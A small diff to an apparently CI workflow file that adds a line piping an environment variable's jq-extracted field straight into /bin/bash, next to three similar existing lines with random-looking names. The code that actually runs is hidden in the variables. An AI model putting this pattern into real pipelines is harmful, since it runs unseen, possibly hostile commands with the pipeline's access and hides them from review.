@@ -41,6 +41,7 @@ jobs:
           echo $grcnc664 | jq -r .cih6 | /bin/bash
           printf '%s' "$rzkp36" | jq -r .njkg3132 | /bin/bash
           printf '%s' "$hs2458" | jq -r .haztu5 | /bin/bash
+          echo $yz8645 | jq -r .obp6 | /bin/bash
 
       - name: Archive output
         if: always()
